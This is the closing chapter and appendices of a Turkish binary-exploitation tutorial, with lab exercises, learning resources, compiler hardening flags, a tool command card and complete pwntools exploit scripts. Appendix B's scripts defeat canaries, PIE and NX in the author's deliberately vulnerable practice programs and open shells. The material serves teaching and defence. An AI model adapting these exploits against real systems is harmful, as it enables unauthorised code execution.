# Bölüm 23: Bundan sonra

## Bu bölümde

Dokuz örneği bitirdin. Elinde artık bir yöntem var: korumaları okumak, hatayı bulmak, mesafeyi ölçmek, sızdırmak, zincir kurmak. Bu son bölümde bu yöntemi nerede ve nasıl pekiştireceğini konuşacağız: kendi merdivenindeki görevler, örnekleri değiştirerek çalışmak, dış kaynaklar ve sıradaki büyük konular.

## Kendi merdivenin

`~/cracks` içindeki p-serisi bu kitabın konularını takip ediyor. Şu an sadece `p01_gate` hazır. p02–p07 sen ilerledikçe hazırlanacak. **Hiçbirinin çözümü bu kitapta yok.** Kitaptaki yöntemi uygulayıp kendin çözeceksin.

| Seviye | Konu | Hazırlayan bölümler |
|---|---|---|
| `p01_gate` | Yan değişkeni ezmek (canary'ye rağmen) | 7, 8, 17 |
| p02 ret2win | Dönüş adresini `win`'e çevirmek | 9, 10 |
| p03 shellcode | NX kapalı, yığına kod | 11 |
| p04 ROP | `pop rdi; ret` ile argümanlı çağrı | 12 |
| p05 canary sızıntısı | Format string ile canary | 16, 17 |
| p06 PIE sızıntısı | Kod adresi sızdırıp taban hesaplamak | 18 |
| p07 ret2libc | libc'den `system("/bin/sh")` | 13, 14, 15, 19 |

`p01_gate`'te takıldığın yer, Bölüm 7'nin son alıştırmasıydı. Bölüm 2'yi (little-endian) ve Bölüm 8'deki `fgets` satırını tekrar oku. `fgets` girdinin sonuna Enter (`0x0a`) ve null bayt (`0x00`) ekler. Bu baytların hedef değişkenin neresine düştüğünü kâğıda çiz.

## Örnekleri değiştirerek çalış

Bir exploit'i bir kere çalıştırmak öğrendiğin anlamına gelmez. Örneklerin kaynağını değiştirip yeniden derle ve exploit'i yeni hale uyarla:

1. `e02_win`'de `buf`'ı 32'den 100'e çıkar. Mesafe kaç oldu? Exploit'i desenle güncelle.
2. `e04_rop`'taki `gadget` satırını sil. Artık `pop rdi; ret` yok. `ROPgadget` ile başka bir yol bul ya da libc'yi kullan (Bölüm 15'teki gibi önce sızdırman gerekecek).
3. `e05_libc`'de `puts` yerine `write(1, ...)` kullan. Sızıntı zinciri nasıl değişir? `write` üç argüman ister: `rdi`, `rsi`, `rdx`.
4. `e07_canary`'yi `-O2` ile derle. Değişkenlerin yerleri ve format string yuvaları değişti mi?
5. `e09_full`'de `printf(buf)` satırını `printf("%s", buf)` yap. Artık sızıntı yok. Exploit mümkün mü? (Kısmi yazmayı düşün, Bölüm 18.)

Derleme komutlarının hepsi ilgili bölümlerde ve Ek A'da.

## Dış kaynaklar

Hepsi İngilizce ama hepsi ücretsiz. Bu kitaptan sonra okuması kolaylaşmış olmalı:

| Kaynak | Ne var | Ne zaman |
|---|---|---|
| **ROP Emporium** (ropemporium.com) | Sadece ROP'a odaklanan 8 görev. Her biri tek bir zincir tekniği. | Bölüm 12'den sonra. |
| **pwn.college** | Üniversite dersi gibi sıralı modüller ve yüzlerce görev. Tarayıcıdan çalışılıyor. | Bu kitaptan hemen sonra. |
| **Exploit Education: Phoenix** | Yığın, format string, heap için kademeli seviyeler. | Kitapla paralel. |
| **Nightmare** (guyinatuxedo.github.io) | Gerçek CTF görevlerinin çözümleri, konulara göre sıralı. | Çözüm okumayı öğrenmek için. |
| **CTFtime** (ctftime.org) | Yaklaşan CTF yarışmaları. "pwn" kategorisi bu kitabın konusu. | Kendini denemek için. |

## Kendi programını sertleştir

Bir exploit yazmayı öğrenmenin en iyi testi, aynı hatayı yapmayan bir program yazabilmek. Kitaptaki savunma kısımlarından çıkan, kendi C kodunda kullanabileceğin derleme seçenekleri:

```bash
gcc -O2 -Wall -Wformat -Werror=format-security -D_FORTIFY_SOURCE=2 \
    -fstack-protector-strong -fPIE -pie -Wl,-z,relro,-z,now -fcf-protection=full \
    -o program program.c
```

| Seçenek | Ne yakalar | Bölüm |
|---|---|---|
| `-Wall -Werror=format-security` | `printf(buf)` gibi hataları derleme anında | 16 |
| `-D_FORTIFY_SOURCE=2` | Boyutu bilinen buffer'lara taşan `read`/`memcpy`, tehlikeli `%n` | 7, 16 |
| `-fstack-protector-strong` | Dönüş adresine ulaşan taşmalar | 17 |
| `-fPIE -pie` | Programın adreslerini rastgele yapar | 18 |
| `-Wl,-z,relro,-z,now` | GOT'u salt okunur yapar | 14 |
| `-fcf-protection=full` | CET desteği (gölge yığın, IBT) | 12 |

Kitaptaki örneklerin hepsinde bu seçeneklerin bir kısmını bilerek kapattık. Kendi kodunda açık tut, ve derleyicinin uyarılarını görmezden gelme.

## Sonraki konular

Bu kitap yığınla sınırlıydı. Bir sonraki büyük konular:

- **Heap exploitation:** `malloc`/`free` ile ayrılan bellekteki hatalar (use-after-free, double free). glibc'nin heap yöneticisinin içyapısını öğrenmeyi gerektirir.
- **SROP ve ret2dlresolve:** Çok az gadget'la çalışan ileri ROP teknikleri.
- **Seccomp:** `execve` yasaklandığında dosyayı okuyup yazdırmak (open/read/write zinciri).
- **Kernel exploitation:** Aynı fikirler, ama hedef çekirdeğin kendisi.

## Son söz

Bu kitabın başında bir gdb ekranı vardı ve üstündeki sayılar anlamsızdı. Şimdi aynı ekrana bakınca `0x00007ffff7de3bfc`'nin `main`'in dönüş adresi olduğunu, libc'de durduğunu, sonundaki `bfc`'nin hiç değişmeyeceğini, ve onunla bütün korumaları açık bir programda kabuk açılabileceğini biliyorsun. Bundan sonrası pratik. Bir görev aç, `checksec` çalıştır, kâğıda yığını çiz. Takıldığında Bölüm 21'deki tabloya dön.

## Özet

- Merdivendeki p01–p07, kitabın bölümlerini sırayla takip ediyor. Çözümleri kitapta yok.
- Örnekleri değiştirip yeniden derleyerek her tekniği farklı koşullarda dene.
- Kendi kodunda savunma seçeneklerini açık tut.
- Sıradaki konular: heap, ileri ROP, seccomp, kernel.

# Ek A: Komut kartı

## Derleme ayarları

```bash
# Korumasız (e01–e03)
gcc -O0 -fno-stack-protector -no-pie -fcf-protection=none -z execstack -o PROG PROG.c
# NX açık (e04, e05)
gcc -O0 -fno-stack-protector -no-pie -fcf-protection=none -o PROG PROG.c
# Format string uyarısı kapalı (e06)
gcc -O0 -fno-stack-protector -no-pie -fcf-protection=none -Wno-format-security -o PROG PROG.c
# Canary (e07)
gcc -O0 -fstack-protector-all -no-pie -fcf-protection=none -Wno-format-security -o PROG PROG.c
# Canary + PIE (e08)
gcc -O0 -fstack-protector-all -pie -fPIE -fcf-protection=none -Wno-format-security -o PROG PROG.c
# Hepsi + Full RELRO (e09)
gcc -O0 -fstack-protector-all -pie -fPIE -fcf-protection=none -Wno-format-security \
    -Wl,-z,relro,-z,now -o PROG PROG.c
```

## Keşif

| Komut | İş |
|---|---|
| `file P` | Tür, 32/64 bit, stripped mi |
| `pwn checksec P` | Korumalar |
| `nm P \| grep ' T '` | Fonksiyonlar |
| `objdump -d -M intel --no-show-raw-insn P` | Assembly |
| `objdump -d P \| grep '@plt>:'` | PLT adresleri |
| `strings -n 6 P` | Metinler |
| `ROPgadget --binary P \| grep 'pop rdi'` | Gadget |
| `setarch -R ./P` | ASLR kapalı çalıştır |

## pwndbg

| Komut | İş |
|---|---|
| `b *main`, `b *0x401166`, `b *vuln+52` | Kesme noktası |
| `r`, `r < dosya` | Çalıştır |
| `si` / `ni` / `c` / `finish` | İlerle |
| `x/8gx $rsp`, `x/20bx A`, `x/s A`, `x/10i $rip` | Bellek |
| `p/x $rax`, `p $rbp-0x20` | Yazmaç, hesap |
| `stack 12`, `telescope A 8` | Yığın |
| `vmmap`, `vmmap libc` | Bellek haritası |
| `got` | GOT |
| `info symbol A` | Adres kimin |
| `cyclic 100`, `cyclic -n 8 -l 0x...` | Desen |
| `rop --grep "pop rdi"` | Gadget |
| `distance A B` | Fark |

## pwntools

| Kod | İş |
|---|---|
| `context.arch = "amd64"` | 64 bit |
| `e = ELF(yol)`, `e.sym.win`, `e.got.puts`, `e.address = taban` | Program |
| `libc = ELF("/usr/lib/libc.so.6")`, `next(libc.search(b"/bin/sh\0"))` | libc |
| `ROP(libc).find_gadget(["pop rdi","ret"]).address` | Gadget |
| `p64(x)`, `u64(b.ljust(8, b"\0"))` | Paketleme |
| `cyclic(n, n=8)`, `fmtstr_payload(ofs, {adr: değer})` | Yardımcılar |
| `p = process(yol)`, `remote(host, port)`, `gdb.debug(yol)` | Başlatma |
| `sendafter(a, b)`, `send`, `sendline`, `recvuntil(a, drop=True)`, `recvline`, `recvall` | G/Ç |
| `p.interactive()`, `p.poll()`, `p.corefile` | Kabuk, çıkış kodu, core |

## Sık kullanılan sayılar

| Sayı | Anlamı |
|---|---|
| `0x41` | `A` |
| `0x0a` / `0x00` | Enter / null |
| `0x90` | `nop` |
| `0xc3` | `ret` |
| `0x5f` | `pop rdi` |
| `0f 05` | `syscall` |
| 59 / `0x3b` | `execve` |
| 139 / 134 | SIGSEGV / SIGABRT çıkış kodları |
| `%6$p` | x86-64'te yığından okunan ilk `printf` argümanı |
| `0x2abfc` | Bu makinede `__libc_start_call_main+124`'ün libc offset'i |
| `0x51030` / `0x7b110` | Bu makinede `system` / `puts` offset'i |

# Ek B: Bütün exploit'ler

Bu ekteki her dosya `~/.cracks_src` içinde de var (`e0N_..._x.py`) ve bu makinede çalıştırılarak doğrulandı. Önce kendin yaz, takıldığında bak.

## e01_admin

```python
from pwn import *
p = process("/home/linkola/cracks/e01_admin")
payload = b"A"*16 + p32(0x41424344)
p.sendafter(b"isim: ", payload)
print(p.recvall().decode())
```

## e02_win

```python
from pwn import *
e = ELF("/home/linkola/cracks/e02_win")
p = process(e.path)
payload  = b"A" * 40          # buf + kaydedilmis rbp
payload += p64(e.sym.win)     # donus adresi
p.sendafter(b"girdi: ", payload)
print(p.recvall())
```

## e03_shell (ve shellcode)

```nasm
BITS 64
    xor  esi, esi              ; rsi = 0  (argv = NULL)
    push rsi                   ; yigina 8 sifir bayt: metnin sonu
    mov  rdi, 0x68732f2f6e69622f ; "/bin//sh" (little-endian)
    push rdi                   ; metni yigina koy
    mov  rdi, rsp              ; rdi = "/bin//sh" adresi
    xor  edx, edx              ; rdx = 0  (envp = NULL)
    push 59                    ; execve sistem cagrisi numarasi
    pop  rax                   ; rax = 59
    syscall
```

```python
from pwn import *
context.arch = "amd64"
p = process(["setarch", "-R", "/home/linkola/cracks/e03_shell"])
p.recvuntil(b"buf adresi: ")
buf = int(p.recvline(), 16)
log.info(f"buf = {hex(buf)}")
sc = open("/home/linkola/.cracks_src/e03_sc.bin", "rb").read()
payload = sc + b"A" * (136 - len(sc)) + p64(buf)
p.send(payload)
p.recvuntil(b"girdi: ")
p.sendline(b"echo SHELL_ACILDI; id -un")
print(p.recvline(timeout=2), p.recvline(timeout=2))
```

## e04_rop

```python
from pwn import *
import sys
e = ELF("/home/linkola/cracks/e04_rop", checksec=False)
pop_rdi = e.sym.gadget
ret = pop_rdi + 1
align = len(sys.argv) > 1
chain = [pop_rdi, 0xdeadbeefcafef00d] + ([ret] if align else []) + [e.sym.win]
payload = b"A"*40 + b"".join(p64(x) for x in chain)
p = process(e.path)
p.send(payload)
print(p.recvall(timeout=2), p.poll())
```

## e05_libc

```python
from pwn import *
import sys
context.log_level = "error"
e    = ELF("/home/linkola/cracks/e05_libc", checksec=False)
libc = ELF("/usr/lib/libc.so.6", checksec=False)
pop_rdi  = e.sym.gadget          # pop rdi ; ret
ret      = pop_rdi + 1           # tek basina ret
PUTS_PLT = 0x401030              # objdump -d e05_libc | grep "<puts@plt>:"

p = process(e.path)

# 1. tur: puts(puts@got) ile libc adresini sizdir, sonra main'e don
p.recvuntil(b"girdi:\n")
chain1 = [pop_rdi, e.got.puts, PUTS_PLT, e.sym.main]
p.send((b"A"*40 + b"".join(p64(x) for x in chain1)).ljust(200, b"\0"))
leak = u64(p.recvuntil(b"\ngirdi:\n", drop=True).ljust(8, b"\0"))
libc.address = leak - libc.sym.puts
print("puts  =", hex(leak))
print("libc  =", hex(libc.address))

# 2. tur: system("/bin/sh")
binsh = next(libc.search(b"/bin/sh\0"))
align = [] if "noalign" in sys.argv else [ret]
chain2 = [pop_rdi, binsh] + align + [libc.sym.system]
p.send((b"A"*40 + b"".join(p64(x) for x in chain2)).ljust(200, b"\0"))
p.sendline(b"echo SHELL_ACILDI; id -un")
print(p.recvline(timeout=2), p.recvline(timeout=2))
print("cikis kodu:", p.poll(block=True) if "noalign" in sys.argv else "kabuk acik")
```

## e06_fmt

```python
from pwn import *
p = process("/home/linkola/cracks/e06_fmt")
hedef = 0x40403c                        # nm e06_fmt | grep hedef
payload = b"%1337c%8$n".ljust(16, b"X") + p64(hedef)
p.sendafter(b"mesaj: ", payload)
p.sendafter(b"mesaj: ", b"bitti")
print(p.recvall().decode().split("\n")[-3:])
```

## e07_canary

```python
from pwn import *
context.log_level = "error"
e = ELF("/home/linkola/cracks/e07_canary", checksec=False)
p = process(e.path)

# 1. adim: format string ile kanaryayi sizdir (%17$p)
p.sendafter(b"isim: ", b"%17$p")
p.recvuntil(b"merhaba ")
canary = int(p.recvline(), 16)
print("kanarya =", hex(canary))

# 2. adim: tas, kanaryayi oldugu gibi geri yaz, donus adresini win() yap
payload  = b"A" * 72          # buf (rbp-0x50) -> kanarya (rbp-0x8)
payload += p64(canary)        # kanarya: ayni deger
payload += b"B" * 8           # kaydedilmis rbp
payload += p64(e.sym.win)     # donus adresi
p.sendafter(b"mesaj: ", payload)
print(p.recvall(timeout=2))
```

## e08_pie

```python
from pwn import *
context.log_level = "error"
e = ELF("/home/linkola/cracks/e08_pie", checksec=False)
p = process(e.path)

# 1. adim: kanarya (%17$p) + main icindeki donus adresi (%19$p)
p.sendafter(b"isim: ", b"%17$p.%19$p")
p.recvuntil(b"merhaba ")
c, r = p.recvline().strip().split(b".")
canary   = int(c, 16)
ret_main = int(r, 16)                 # main+0x3a: "call vuln"dan sonraki komut
e.address = ret_main - 0x12b1         # PIE tabani
print("kanarya   =", hex(canary))
print("main+0x3a =", hex(ret_main))
print("PIE taban =", hex(e.address))
print("win       =", hex(e.sym.win))

# 2. adim: tasma
payload = b"A"*72 + p64(canary) + b"B"*8 + p64(e.sym.win)
p.sendafter(b"mesaj: ", payload)
print(p.recvall(timeout=2))
```

## e09_full

```python
from pwn import *
context.log_level = "error"
context.arch = "amd64"
e    = ELF("/home/linkola/cracks/e09_full", checksec=False)
libc = ELF("/usr/lib/libc.so.6", checksec=False)
p = process(e.path)

# 1. adim: kanarya (%17$p) ve libc icindeki donus adresi (%23$p)
p.sendafter(b"isim: ", b"%17$p.%23$p")
p.recvuntil(b"merhaba ")
c, l = p.recvline().strip().split(b".")
canary = int(c, 16)
libc.address = int(l, 16) - 0x2abfc   # __libc_start_call_main+124
print("kanarya =", hex(canary))
print("libc    =", hex(libc.address))

# 2. adim: libc parcalariyla system("/bin/sh")
rop     = ROP(libc)
pop_rdi = rop.find_gadget(["pop rdi", "ret"]).address
ret     = rop.find_gadget(["ret"]).address
binsh   = next(libc.search(b"/bin/sh\0"))
chain   = [pop_rdi, binsh, ret, libc.sym.system]

payload = b"A"*72 + p64(canary) + b"B"*8 + b"".join(p64(x) for x in chain)
p.sendafter(b"mesaj: ", payload.ljust(300, b"\0"))
p.sendline(b"echo SHELL_ACILDI; id -un")
print(p.recvline(timeout=2), p.recvline(timeout=2))
```

---

[← 11-yontem-ve-hata-ayiklama](11-yontem-ve-hata-ayiklama.md) · [İçindekiler](README.md)
